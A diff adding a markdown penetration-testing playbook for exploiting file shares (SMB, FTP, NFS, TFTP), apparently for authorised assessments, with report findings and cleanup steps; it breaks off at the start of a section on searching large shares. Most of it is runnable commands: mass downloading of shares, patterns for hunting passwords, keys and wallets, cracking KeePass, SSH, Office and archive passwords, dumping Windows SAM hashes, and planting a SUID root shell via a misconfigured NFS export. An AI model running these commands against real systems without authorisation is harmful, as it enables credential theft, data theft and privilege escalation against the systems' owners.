@@ -1,0 +1,1463 @@
+# File Share Enumeration and Exploitation Methodology
+
+---
+
+## 1. SMB/CIFS Share Enumeration and Exploitation
+
+**Category:** Network File Shares  
+**Description:** Enumerate and exploit SMB/CIFS shares for sensitive data and credentials.
+
+**Tools Required:**
+- smbclient
+- smbmap
+- enum4linux
+- crackmapexec
+- mount.cifs
+- impacket
+
+**Steps/Commands:**
+```bash
+# Initial enumeration
+smbmap -H <TARGET_IP>
+smbmap -H <TARGET_IP> -u '' -p ''  # Null session
+smbmap -H <TARGET_IP> -u 'guest' -p ''  # Guest access
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD>  # With creds
+
+# List shares with crackmapexec
+crackmapexec smb <TARGET_IP> --shares
+crackmapexec smb <TARGET_IP> -u '' -p '' --shares  # Null session
+crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --shares
+
+# Connect to specific share
+smbclient //<TARGET_IP>/<SHARE_NAME> -U <USERNAME>
+smbclient //<TARGET_IP>/<SHARE_NAME> -N  # No password
+
+# Mount share locally for easier browsing
+mkdir /mnt/smb_share
+mount -t cifs //<TARGET_IP>/<SHARE_NAME> /mnt/smb_share -o username=<USERNAME>,password=<PASSWORD>
+# Or for null session
+mount -t cifs //<TARGET_IP>/<SHARE_NAME> /mnt/smb_share -o username='',password=''
+
+# Recursive download of entire share
+smbget -R smb://<TARGET_IP>/<SHARE_NAME> -U <USERNAME>%<PASSWORD>
+# Using smbclient
+smbclient //<TARGET_IP>/<SHARE_NAME> -U <USERNAME> -c 'recurse ON; prompt OFF; mget *'
+
+# Search for specific files
+# Using smbmap
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R <SHARE_NAME> --pattern '*.txt'
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R <SHARE_NAME> --pattern 'pass*'
+
+# Using crackmapexec
+crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --spider <SHARE_NAME> --pattern pass
+
+# Find and download interesting files
+# Config files
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.config'
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.conf'
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.xml'
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.ini'
+
+# Database files
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.db'
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.sqlite'
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.mdb'
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.sql'
+
+# Password files
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*pass*'
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*cred*'
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.kdbx'  # KeePass
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.psafe3'  # PasswordSafe
+
+# Office documents
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.xlsx'
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -R --pattern '*.docx'
+
+# Download specific file
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> --download '<SHARE_NAME>/<FILE_PATH>'
+
+# Using Impacket for advanced operations
+impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+# In the shell:
+shares
+use <SHARE_NAME>
+ls
+get <FILE_NAME>
+mget *
+```
+
+**What to Look For:**
+```bash
+# High-value targets
+*password*
+*cred*
+*secret*
+*key*
+*token*
+*.kdbx  # KeePass databases
+*.psafe3  # Password Safe
+*.1pif  # 1Password
+*.agilekeychain  # 1Password
+*wallet*
+*.jks  # Java keystore
+*.p12  # Certificate
+*.pfx  # Certificate
+*.pem  # Certificate
+*.ppk  # PuTTY private key
+id_rsa  # SSH private key
+*.ovpn  # VPN configs
+*.rdp  # RDP files
+
+# Configuration files
+web.config
+app.config
+*.conf
+*.cfg
+*.ini
+*.xml
+*.json
+*.yaml
+*.yml
+*.env
+.htpasswd
+.htaccess
+wp-config.php
+config.php
+database.yml
+
+# Database files
+*.db
+*.sqlite
+*.sqlite3
+*.mdb  # Access DB
+*.accdb  # Access DB
+*.sql
+*.dump
+*.bak
+
+# Source code
+*.php
+*.asp
+*.aspx
+*.py
+*.rb
+*.js
+*.java
+*.cs
+*.vb
+.git/
+.svn/
+
+# Documents
+*.xlsx
+*.xls
+*.docx
+*.doc
+*.pdf
+*.csv
+*.txt
+
+# Backups and archives
+*.bak
+*.backup
+*.old
+*.orig
+*.zip
+*.rar
+*.7z
+*.tar
+*.gz
+
+# System files
+SAM
+SYSTEM
+SECURITY
+ntds.dit
+unattend.xml
+sysprep.xml
+groups.xml
+```
+
+**Pitfalls:**
+- Large shares timeout downloads
+- Access denied on certain files
+- Hidden shares not listed
+- Anti-virus quarantine
+- File locks preventing access
+
+**Cleanup Steps:**
+```bash
+# Unmount shares
+umount /mnt/smb_share
+# Clear downloaded files
+rm -rf ./smb_loot/
+```
+
+**Suggested Findings:**
+- Sensitive data exposure
+- Password files accessible
+- Configuration disclosure
+- Source code exposure
+- Backup files containing credentials
+
+**Conditions When to Try:**
+- SMB ports open (445, 139)
+- Windows environment
+- Domain network
+- File server identified
+
+---
+
+## 2. FTP Share Enumeration and Exploitation
+
+**Category:** File Transfer Services  
+**Description:** Enumerate FTP servers and download sensitive files.
+
+**Tools Required:**
+- ftp
+- ncftp
+- wget
+- curl
+- lftp
+
+**Steps/Commands:**
+```bash
+# Check anonymous access
+ftp <TARGET_IP>
+# Username: anonymous
+# Password: anonymous@test.com
+
+# Using ncftp for better features
+ncftp -u anonymous -p anonymous@test.com <TARGET_IP>
+
+# List all files recursively
+# In FTP session:
+ls -R
+dir -R
+
+# Using lftp for advanced operations
+lftp ftp://anonymous@<TARGET_IP>
+# In lftp:
+ls -la
+find .
+mirror . ./ftp_loot  # Download everything
+
+# Download entire FTP recursively
+wget -r ftp://anonymous:anonymous@<TARGET_IP>/
+wget --mirror --no-parent ftp://<USERNAME>:<PASSWORD>@<TARGET_IP>/
+
+# Search for specific files
+# Using lftp
+lftp -e 'find . | grep -i password; exit' ftp://<USERNAME>:<PASSWORD>@<TARGET_IP>
+lftp -e 'find . | grep -i "\.conf\|\.config"; exit' ftp://<USERNAME>:<PASSWORD>@<TARGET_IP>
+
+# Download specific file types
+wget -r -A "*.txt,*.pdf,*.doc*,*.xls*" ftp://<USERNAME>:<PASSWORD>@<TARGET_IP>/
+
+# Check for hidden files
+ftp> ls -la
+ftp> dir -a
+
+# Script to enumerate and download
+cat > ftp_enum.sh << 'EOF'
+#!/bin/bash
+HOST=$1
+USER=${2:-anonymous}
+PASS=${3:-anonymous@test.com}
+
+echo "Connecting to $HOST..."
+lftp -e "
+set ssl:verify-certificate false
+open ftp://$USER:$PASS@$HOST
+find . > /tmp/ftp_files.txt
+mirror . ./ftp_loot_$HOST
+exit
+"
+
+echo "Files found:"
+cat /tmp/ftp_files.txt | head -20
+echo "Looking for interesting files..."
+grep -i "pass\|cred\|secret\|key\|token\|config" /tmp/ftp_files.txt
+EOF
+chmod +x ftp_enum.sh
+./ftp_enum.sh <TARGET_IP>
+
+# Check for FTP bounce attack
+nmap -Pn -v -p 21 --script ftp-bounce <TARGET_IP>
+
+# Check if we can upload files
+ftp> put test.txt
+ftp> mkdir test
+ftp> delete test.txt
+```
+
+**What to Look For:**
+```bash
+# Same as SMB, plus:
+- Web roots (www, htdocs, public_html)
+- Backup directories
+- Database dumps
+- Log files
+- User home directories
+- /etc/ directory (misconfigs)
+```
+
+**Pitfalls:**
+- Binary vs ASCII transfer mode
+- Passive vs Active mode issues
+- Large files timeout
+- Rate limiting
+- Hidden files not shown
+
+**Cleanup Steps:**
+```bash
+# Remove downloaded files
+rm -rf ftp_loot_*
+# Delete uploaded test files if any
+ftp> delete test.txt
+```
+
+**Suggested Findings:**
+- Anonymous FTP access
+- Sensitive file disclosure
+- Writable directories
+- FTP bounce possible
+
+**Conditions When to Try:**
+- Port 21 open
+- Anonymous access allowed
+- Legacy systems
+- Backup servers
+
+---
+
+## 3. NFS Share Enumeration and Exploitation
+
+**Category:** Network File System  
+**Description:** Enumerate and exploit NFS shares on Unix/Linux systems.
+
+**Tools Required:**
+- showmount
+- mount
+- nfsstat
+- rpcinfo
+- nmap
+
+**Steps/Commands:**
+```bash
+# Enumerate NFS shares
+showmount -e <TARGET_IP>
+showmount -a <TARGET_IP>  # Show all mount points
+
+# RPC enumeration
+rpcinfo -p <TARGET_IP>
+nmap -sV -p 111 --script=rpcinfo <TARGET_IP>
+
+# Detailed NFS enumeration
+nmap -p 111,2049 --script nfs* <TARGET_IP>
+nmap -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <TARGET_IP>
+
+# Mount NFS share
+mkdir /mnt/nfs_share
+mount -t nfs <TARGET_IP>:/<SHARE_PATH> /mnt/nfs_share
+mount -t nfs -o vers=<VERSION> <TARGET_IP>:/<SHARE_PATH> /mnt/nfs_share
+
+# Mount with different options
+mount -t nfs -o nolock <TARGET_IP>:/<SHARE_PATH> /mnt/nfs_share
+mount -t nfs -o ro <TARGET_IP>:/<SHARE_PATH> /mnt/nfs_share  # Read-only
+mount -t nfs -o rw <TARGET_IP>:/<SHARE_PATH> /mnt/nfs_share  # Read-write
+
+# Browse mounted share
+cd /mnt/nfs_share
+ls -la
+find . -type f -name "*.conf" 2>/dev/null
+find . -type f -name "*pass*" 2>/dev/null
+
+# Check permissions and UID/GID
+ls -lan  # Show numeric UIDs/GIDs
+stat <FILE>  # Detailed file info
+
+# UID/GID manipulation for access
+# If no_root_squash is enabled
+sudo -s
+cd /mnt/nfs_share
+ls -la  # Now as root
+
+# If specific UID needed
+useradd -u <UID> tempuser
+su - tempuser
+cd /mnt/nfs_share
+
+# Search for sensitive files
+find /mnt/nfs_share -name "*password*" 2>/dev/null
+find /mnt/nfs_share -name "*.key" 2>/dev/null
+find /mnt/nfs_share -name "*.pem" 2>/dev/null
+find /mnt/nfs_share -name "id_rsa*" 2>/dev/null
+find /mnt/nfs_share -name "*.kdbx" 2>/dev/null
+
+# Copy entire share
+rsync -av /mnt/nfs_share/ ./nfs_loot/
+tar -czf nfs_backup.tar.gz /mnt/nfs_share/
+
+# Check for SUID binaries (privilege escalation)
+find /mnt/nfs_share -perm -4000 2>/dev/null
+
+# If no_root_squash, try creating SUID binary
+cp /bin/bash /mnt/nfs_share/rootbash
+chmod +s /mnt/nfs_share/rootbash
+# Then execute from target system
+
+# Check NFS version and security
+nfsstat -m
+rpcinfo -p <TARGET_IP> | grep nfs
+
+# Test write permissions
+touch /mnt/nfs_share/test.txt
+echo "test" > /mnt/nfs_share/test.txt
+mkdir /mnt/nfs_share/testdir
+```
+
+**What to Look For:**
+```bash
+# NFS-specific targets
+- no_root_squash misconfigurations
+- World-readable home directories
+- SUID/SGID binaries
+- Script files that run as root
+- Cron job scripts
+- Docker volumes
+- Kubernetes persistent volumes
+- VMware datastores
+```
+
+**Pitfalls:**
+- UID/GID mapping issues
+- Root squashing enabled
+- Read-only exports
+- Stale file handles
+- Version compatibility
+
+**Cleanup Steps:**
+```bash
+# Unmount NFS share
+umount /mnt/nfs_share
+# Remove test files
+rm /mnt/nfs_share/test*
+# Delete temporary users
+userdel tempuser
+```
+
+**Suggested Findings:**
+- No root squash enabled
+- World-writable shares
+- SUID binary placement
+- Sensitive data exposure
+
+**Conditions When to Try:**
+- Port 2049/111 open
+- Unix/Linux environment
+- Storage networks
+- Container orchestration
+
+---
+
+## 4. TFTP Enumeration and Exploitation
+
+**Category:** Trivial File Transfer  
+**Description:** Enumerate and exploit TFTP servers (no authentication).
+
+**Tools Required:**
+- tftp
+- atftp
+- tftpbrute
+- nmap
+
+**Steps/Commands:**
+```bash
+# TFTP has no directory listing capability
+# Must guess/brute force filenames
+
+# Connect to TFTP
+tftp <TARGET_IP>
+tftp> status
+tftp> binary  # Set binary mode
+tftp> get <FILENAME>
+
+# Using atftp (better client)
+atftp <TARGET_IP>
+tftp> get <FILENAME>
+tftp> put <FILENAME>
+
+# Common files to try
+# Network device configs
+echo "get running-config" | tftp <TARGET_IP>
+echo "get startup-config" | tftp <TARGET_IP>
+echo "get config.cfg" | tftp <TARGET_IP>
+echo "get config.bin" | tftp <TARGET_IP>
+echo "get router.cfg" | tftp <TARGET_IP>
+
+# Brute force filenames
+cat > tftp_files.txt << 'EOF'
+running-config
+startup-config
+config.cfg
+config.bin
+network-confg
+router.cfg
+switch.cfg
+fw.cfg
+firewall.cfg
+backup.cfg
+admin.cfg
+boot.ini
+passwd
+shadow
+web.config
+database.yml
+wp-config.php
+config.php
+.htpasswd
+id_rsa
+id_rsa.pub
+authorized_keys
+backup.tar
+backup.zip
+EOF
+
+for file in $(cat tftp_files.txt); do
+    echo "Trying: $file"
+    echo "get $file" | tftp <TARGET_IP> 2>/dev/null
+    if [ -f "$file" ]; then
+        echo "[+] Downloaded: $file"
+        mv "$file" "tftp_loot_$file"
+    fi
+done
+
+# Using Metasploit
+msfconsole -x "use auxiliary/scanner/tftp/tftpbrute; set RHOSTS <TARGET_IP>; run"
+
+# Test write permissions
+echo "test" > test.txt
+echo "put test.txt" | tftp <TARGET_IP>
+echo "get test.txt" | tftp <TARGET_IP>  # Verify upload
+
+# PXE boot files (common in TFTP)
+echo "get pxelinux.0" | tftp <TARGET_IP>
+echo "get pxelinux.cfg/default" | tftp <TARGET_IP>
+echo "get boot.wim" | tftp <TARGET_IP>
+echo "get bootmgr.exe" | tftp <TARGET_IP>
+
+# Cisco IOS images
+echo "get c2960-lanbasek9-mz.150-2.SE.bin" | tftp <TARGET_IP>
+echo "get c2800nm-adventerprisek9-mz.124-24.T.bin" | tftp <TARGET_IP>
+```
+
+**What to Look For:**
+```bash
+# TFTP-specific files
+- Network device configurations
+- PXE boot images
+- Firmware files
+- IOS images
+- Bootloader configs
+- VOIP phone configs
+- Thin client images
+```
+
+**Pitfalls:**
+- No directory listing
+- UDP packet loss
+- Size limitations
+- No authentication/encryption
+- Filename guessing required
+
+**Cleanup Steps:**
+```bash
+# Remove test files
+rm test.txt tftp_loot_*
+# Delete from server if writable
+echo "delete test.txt" | tftp <TARGET_IP>
+```
+
+**Suggested Findings:**
+- TFTP service exposed
+- Configuration file disclosure
+- Writable TFTP root
+- Network device configs exposed
+
+**Conditions When to Try:**
+- UDP port 69 open
+- Network devices present
+- PXE boot environment
+- VOIP infrastructure
+
+---
+
+## 5. Working with Encrypted/Password-Protected Files
+
+**Category:** File Exploitation  
+**Description:** Crack passwords and access encrypted files found on shares.
+
+**Tools Required:**
+- john
+- hashcat
+- fcrackzip
+- pdfcrack
+- office2john
+- keepass2john
+- openssl
+
+**Steps/Commands:**
+```bash
+# ZIP files
+# Try common passwords first
+unzip -P password <FILE>.zip
+unzip -P 123456 <FILE>.zip
+unzip -P <COMPANY_NAME> <FILE>.zip
+
+# Crack ZIP password
+zip2john <FILE>.zip > zip.hash
+john zip.hash --wordlist=<WORDLIST>
+hashcat -m 17200 zip.hash <WORDLIST>  # PKZip
+
+# Using fcrackzip
+fcrackzip -u -D -p <WORDLIST> <FILE>.zip
+fcrackzip -b -c 'aA1' -l 1-10 <FILE>.zip  # Brute force
+
+# RAR files
+rar2john <FILE>.rar > rar.hash
+john rar.hash --wordlist=<WORDLIST>
+hashcat -m 23700 rar.hash <WORDLIST>  # RAR5
+hashcat -m 12500 rar.hash <WORDLIST>  # RAR3
+
+# 7z files
+7z2john <FILE>.7z > 7z.hash
+john 7z.hash --wordlist=<WORDLIST>
+hashcat -m 11600 7z.hash <WORDLIST>
+
+# PDF files
+# Check if encrypted
+pdfinfo <FILE>.pdf
+
+# Crack PDF password
+pdf2john <FILE>.pdf > pdf.hash
+john pdf.hash --wordlist=<WORDLIST>
+hashcat -m 10400 pdf.hash <WORDLIST>  # PDF 1.1-1.3
+hashcat -m 10500 pdf.hash <WORDLIST>  # PDF 1.4-1.6
+hashcat -m 10700 pdf.hash <WORDLIST>  # PDF 1.7
+
+# Using pdfcrack
+pdfcrack -f <FILE>.pdf -w <WORDLIST>
+
+# Microsoft Office files
+# Old Office (97-2003)
+office2john <FILE>.doc > office.hash
+john office.hash --wordlist=<WORDLIST>
+hashcat -m 9700 office.hash <WORDLIST>  # MS Office <= 2003
+hashcat -m 9710 office.hash <WORDLIST>  # MS Office <= 2003 (SHA1+RC4)
+
+# New Office (2007+)
+office2john <FILE>.docx > office.hash
+john office.hash --wordlist=<WORDLIST>
+hashcat -m 9400 office.hash <WORDLIST>  # MS Office 2007
+hashcat -m 9500 office.hash <WORDLIST>  # MS Office 2010
+hashcat -m 9600 office.hash <WORDLIST>  # MS Office 2013+
+
+# LibreOffice/OpenOffice
+libreoffice2john <FILE>.odt > office.hash
+john office.hash --wordlist=<WORDLIST>
+
+# KeePass databases
+keepass2john <FILE>.kdbx > keepass.hash
+john keepass.hash --wordlist=<WORDLIST>
+hashcat -m 13400 keepass.hash <WORDLIST>
+
+# Try without keyfile first
+keepass2john -k <FILE>.kdbx > keepass.hash
+
+# 1Password
+1password2john <FILE>.agilekeychain > 1pass.hash
+john 1pass.hash --wordlist=<WORDLIST>
+
+# Password Safe
+pwsafe2john <FILE>.psafe3 > pwsafe.hash
+john pwsafe.hash --wordlist=<WORDLIST>
+
+# SSH private keys
+# Check if encrypted
+cat id_rsa | head -2  # Look for ENCRYPTED
+
+# Crack SSH key
+ssh2john id_rsa > ssh.hash
+john ssh.hash --wordlist=<WORDLIST>
+hashcat -m 22921 ssh.hash <WORDLIST>  # SSH private key
+
+# PGP/GPG
+gpg2john <FILE>.gpg > gpg.hash
+john gpg.hash --wordlist=<WORDLIST>
+hashcat -m 17010 gpg.hash <WORDLIST>
+
+# TrueCrypt/VeraCrypt volumes
+truecrypt2john <FILE>.tc > tc.hash
+veracrypt2john <FILE>.vc > vc.hash
+hashcat -m 6211 tc.hash <WORDLIST>  # TrueCrypt
+hashcat -m 13711 vc.hash <WORDLIST>  # VeraCrypt
+
+# Common password patterns to try
+cat > common_passwords.txt << 'EOF'
+password
+Password1
+Password123
+<COMPANY_NAME>
+<COMPANY_NAME>123
+<COMPANY_NAME>2020
+<COMPANY_NAME>2021
+<COMPANY_NAME>2022
+<COMPANY_NAME>2023
+<COMPANY_NAME>2024
+admin
+Admin123
+Welcome1
+Welcome123
+Summer2024
+Winter2024
+Spring2024
+Fall2024
+Qwerty123
+123456
+P@ssw0rd
+P@ssword1
+EOF
+
+# Custom wordlist generation
+# Based on company info
+cewl <COMPANY_WEBSITE> -d 2 -m 5 > company_words.txt
+# Add permutations
+john --rules --wordlist=company_words.txt --stdout > company_wordlist.txt
+```
+
+**Pitfalls:**
+- Strong passwords resist cracking
+- Key files may be required
+- Different encryption versions
+- Time-consuming for strong encryption
+- Hardware limitations
+
+**Cleanup Steps:**
+```bash
+# Remove hash files
+rm *.hash
+# Clear cracked passwords from john
+rm ~/.john/john.pot
+```
+
+**Suggested Findings:**
+- Weak password policy
+- Encrypted sensitive data
+- Password reuse patterns
+- Insecure password storage
+
+**Conditions When to Try:**
+- Encrypted files found
+- Password-protected archives
+- Database backups
+- Certificate stores
+
+---
+
+## 6. Working with Database Files
+
+**Category:** Database Exploitation  
+**Description:** Access and extract data from database files found on shares.
+
+**Tools Required:**
+- sqlite3
+- mdb-tools
+- mysql
+- pgdump
+- strings
+- sqlitebrowser
+
+**Steps/Commands:**
+```bash
+# SQLite databases (.db, .sqlite, .sqlite3)
+# Open and explore
+sqlite3 <FILE>.db
+sqlite> .tables
+sqlite> .schema
+sqlite> SELECT * FROM users;
+sqlite> SELECT * FROM credentials;
+sqlite> .dump  # Dump everything
+
+# Search for passwords
+sqlite3 <FILE>.db "SELECT * FROM sqlite_master WHERE type='table';" | grep -i "pass\|user\|cred"
+sqlite3 <FILE>.db "SELECT sql FROM sqlite_master;" | grep -i password
+
+# Extract all data to CSV
+for table in $(sqlite3 <FILE>.db ".tables"); do
+    sqlite3 -header -csv <FILE>.db "SELECT * FROM $table;" > "${table}.csv"
+done
+
+# GUI browser
+sqlitebrowser <FILE>.db
+
+# Microsoft Access (.mdb, .accdb)
+# List tables
+mdb-tables <FILE>.mdb
+mdb-tables -1 <FILE>.mdb  # One per line
+
+# Export schema
+mdb-schema <FILE>.mdb
+
+# Export specific table
+mdb-export <FILE>.mdb <TABLE_NAME>
+mdb-export -I postgres <FILE>.mdb <TABLE_NAME>  # PostgreSQL format
+
+# Export all tables
+for table in $(mdb-tables -1 <FILE>.mdb); do
+    mdb-export <FILE>.mdb "$table" > "${table}.csv"
+done
+
+# MySQL dump files (.sql)
+# Search for sensitive data
+grep -i "INSERT INTO.*user" <FILE>.sql
+grep -i "password\|pwd\|hash" <FILE>.sql
+grep -i "api_key\|token\|secret" <FILE>.sql
+
+# Import to local MySQL
+mysql -u root -p < <FILE>.sql
+mysql -u root -p <DATABASE> < <FILE>.sql
+
+# PostgreSQL dump files
+# Import
+psql -U postgres < <FILE>.sql
+pg_restore -d <DATABASE> <FILE>.dump
+
+# MongoDB files
+# BSON files
+bsondump <FILE>.bson
+bsondump <FILE>.bson --pretty
+
+# Restore to local MongoDB
+mongorestore --db <DATABASE> <FILE>.bson
+
+# LevelDB/RocksDB (directories)
+# Common in applications like Chrome, Bitcoin
+strings <LEVELDB_DIR>/* | grep -i password
+python -c "import leveldb; db = leveldb.LevelDB('<LEVELDB_DIR>'); print(list(db.RangeIter()))"
+
+# Berkeley DB (.db)
+db_dump -p <FILE>.db
+db_dump -p <FILE>.db | grep -A5 -B5 password
+
+# Redis dump (dump.rdb)
+rdb --command json dump.rdb
+redis-server --dbfilename dump.rdb --dir ./
+
+# Extract strings from unknown database formats
+strings <FILE> | grep -i "pass\|user\|admin\|root"
+strings <FILE> | grep -E "[a-zA-Z0-9+/]{20,}" # Base64
+strings <FILE> | grep -E "[0-9a-f]{32}"  # MD5 hashes
+strings <FILE> | grep -E "[0-9a-f]{40}"  # SHA1 hashes
+strings <FILE> | grep -E "[0-9a-f]{64}"  # SHA256 hashes
+
+# Common database locations in files
+# Web applications
+cat web.config | grep -i "connectionstring"
+cat appsettings.json | jq '.ConnectionStrings'
+cat config.php | grep -i "db_\|database\|mysql"
+cat wp-config.php | grep -i "DB_"
+cat .env | grep -i "DB_\|DATABASE_"
+
+# Create script to analyze all DB files
+cat > analyze_databases.sh << 'EOF'
+#!/bin/bash
+for file in $(find . -name "*.db" -o -name "*.sqlite*" -o -name "*.mdb" 2>/dev/null); do
+    echo "[+] Analyzing: $file"
+    file "$file"
+    
+    if [[ $file == *.sqlite* ]] || [[ $file == *.db ]]; then
+        echo "Tables:"
+        sqlite3 "$file" ".tables" 2>/dev/null
+        echo "Searching for credentials..."
+        sqlite3 "$file" "SELECT sql FROM sqlite_master;" 2>/dev/null | grep -i "password\|user\|token"
+    elif [[ $file == *.mdb ]]; then
+        echo "Tables:"
+        mdb-tables "$file" 2>/dev/null
+    fi
+    echo "---"
+done
+EOF
+chmod +x analyze_databases.sh
+```
+
+**What to Look For in Databases:**
+```sql
+-- User tables
+users, accounts, members, customers, employees
+
+-- Authentication tables  
+credentials, passwords, auth, login, sessions
+
+-- API/Token tables
+api_keys, tokens, secrets, oauth
+
+-- Configuration tables
+config, settings, preferences, options
+
+-- Sensitive columns
+password, pwd, pass, passwd
+hash, password_hash, pwd_hash
+salt, password_salt
+token, api_key, api_token
+secret, private_key
+ssn, social_security
+credit_card, cc_number
+bank_account
+```
+
+**Pitfalls:**
+- Large database files
+- Corrupted databases
+- Unknown formats
+- Character encoding issues
+- Missing dependencies
+
+**Cleanup Steps:**
+```bash
+# Drop imported databases
+mysql -u root -p -e "DROP DATABASE <DATABASE>"
+# Remove exported files
+rm *.csv *.sql
+```
+
+**Suggested Findings:**
+- Plaintext passwords in database
+- Weak password hashes
+- API keys exposed
+- PII data disclosure
+- Database credentials
+
+**Conditions When to Try:**
+- Database files found
+- Web application configs
+- Backup files discovered
+- Development environments
+
+---
+
+## 7. Working with Disk Images and Virtual Machines
+
+**Category:** Disk Image Exploitation  
+**Description:** Mount and explore disk images, VM files, and backups.
+
+**Tools Required:**
+- mount
+- losetup
+- qemu-img
+- vmware-mount
+- guestmount
+- 7z
+- binwalk
+
+**Steps/Commands:**
+```bash
+# Identify disk image type
+file <IMAGE_FILE>
+fdisk -l <IMAGE_FILE>
+
+# Raw disk images (.img, .dd, .raw)
+# Setup loop device
+sudo losetup -f -P <IMAGE_FILE>
+sudo losetup -l  # List loop devices
+
+# Mount partitions
+sudo mkdir /mnt/image
+sudo mount /dev/loop0p1 /mnt/image  # First partition
+# Or calculate offset
+sudo fdisk -l <IMAGE_FILE>  # Note start sector
+# Offset = start_sector * sector_size (usually 512)
+sudo mount -o loop,offset=<OFFSET> <IMAGE_FILE> /mnt/image
+
+# VMDK files (VMware)
+# Convert to raw
+qemu-img convert -f vmdk <FILE>.vmdk -O raw image.raw
+sudo losetup -f -P image.raw
+sudo mount /dev/loop0p1 /mnt/image
+
+# Or use vmware-mount
+vmware-mount <FILE>.vmdk /mnt/image
+
+# VDI files (VirtualBox)
+qemu-img convert -f vdi <FILE>.vdi -O raw image.raw
+# Or
+modprobe nbd
+qemu-nbd -c /dev/nbd0 <FILE>.vdi
+mount /dev/nbd0p1 /mnt/image
+
+# QCOW2 files (QEMU)
+qemu-img convert -f qcow2 <FILE>.qcow2 -O raw image.raw
+# Or
+modprobe nbd
+qemu-nbd -c /dev/nbd0 <FILE>.qcow2
+mount /dev/nbd0p1 /mnt/image
+
+# VHD/VHDX files (Hyper-V)
+qemu-img convert -f vpc <FILE>.vhd -O raw image.raw
+# Or
+guestmount -a <FILE>.vhd -m /dev/sda1 /mnt/image
+
+# Using libguestfs tools (works with many formats)
+guestmount -a <IMAGE_FILE> -i /mnt/image
+# Or specific partition
+guestmount -a <IMAGE_FILE> -m /dev/sda1 /mnt/image
+
+# List filesystems in image
+virt-filesystems -a <IMAGE_FILE> -l
+
+# Browse without mounting
+guestfish -a <IMAGE_FILE>
+><fs> run
+><fs> list-filesystems
+><fs> mount /dev/sda1 /
+><fs> ls /
+><fs> cat /etc/passwd
+
+# Extract files from image
+virt-copy-out -a <IMAGE_FILE> /etc/passwd .
+virt-copy-out -a <IMAGE_FILE> /home/ . -R  # Recursive
+
+# Windows images - Extract SAM/SYSTEM
+virt-copy-out -a <IMAGE_FILE> /Windows/System32/config/SAM .
+virt-copy-out -a <IMAGE_FILE> /Windows/System32/config/SYSTEM .
+# Then use samdump2 or secretsdump.py
+samdump2 SYSTEM SAM
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+# Search mounted image for sensitive files
+find /mnt/image -name "*.kdbx" 2>/dev/null
+find /mnt/image -name "id_rsa*" 2>/dev/null
+find /mnt/image -name "*password*" 2>/dev/null
+find /mnt/image -name "*.key" 2>/dev/null
+grep -r "password" /mnt/image/etc/ 2>/dev/null
+
+# OVA/OVF files (VM exports)
+tar -xvf <FILE>.ova
+# Contains VMDK + config files
+
+# Forensic analysis
+# Timeline
+find /mnt/image -printf "%T+ %p\n" | sort
+
+# Deleted files (if ext3/4)
+extundelete <IMAGE_FILE> --restore-all
+
+# Carve files from unallocated space
+foremost -i <IMAGE_FILE> -o recovered_files
+photorec <IMAGE_FILE>
+
+# Docker images
+docker load < <IMAGE>.tar
+docker image ls
+docker run -it <IMAGE_ID> /bin/bash
+# Or extract layers
+tar -xf <IMAGE>.tar
+for layer in */layer.tar; do
+    tar -xf "$layer"
+done
+
+# ISO files
+mkdir /mnt/iso
+mount -o loop <FILE>.iso /mnt/iso
+# Or extract
+7z x <FILE>.iso
+
+# Encrypted disk images
+# Check for LUKS
+file <IMAGE_FILE> | grep LUKS
+cryptsetup isLuks <IMAGE_FILE>
+# Try to open
+cryptsetup open <IMAGE_FILE> decrypted
+# Common passwords to try
+echo -n "password" | cryptsetup open <IMAGE_FILE> decrypted
+```
+
+**What to Look For in Disk Images:**
+```bash
+# System files
+/etc/passwd, /etc/shadow
+/Windows/System32/config/SAM
+/Windows/System32/config/SYSTEM
+
+# SSH keys
+/home/*/.ssh/
+/root/.ssh/
+
+# History files
+/home/*/.bash_history
+/root/.bash_history
+/home/*/.*_history
+
+# Application data
+/var/www/
+/opt/
+/home/*/Documents/
+
+# Database files
+/var/lib/mysql/
+/var/lib/postgresql/
+
+# Logs
+/var/log/
+/Windows/System32/LogFiles/
+
+# Browser data
+/home/*/.mozilla/
+/home/*/.config/google-chrome/
+
+# Email
+/var/mail/
+/home/*/Mail/
+
+# Backup files
+*.bak, *.backup, *.old
+```
+
+**Pitfalls:**
+- Large image files
+- Encrypted volumes
+- Corrupted images
+- Nested virtualization
+- Permissions issues
+
+**Cleanup Steps:**
+```bash
+# Unmount images
+umount /mnt/image
+# Disconnect NBD devices
+qemu-nbd -d /dev/nbd0
+# Remove loop devices
+losetup -d /dev/loop0
+```
+
+**Suggested Findings:**
+- Sensitive data in VM
+- Hardcoded credentials
+- Unencrypted disk images
+- Deleted file recovery
+- System password hashes
+
+**Conditions When to Try:**
+- Backup files found
+- VM exports discovered
+- Disk images on shares
+- Forensic analysis needed
+
+---
+
+## 8. Searching and Grep Techniques for Large Shares
+
+**Category:** Data Mining  
+**Description:** Efficiently search through large amounts of data on file shares.
+
+**Tools Required:**
+- grep
+- find
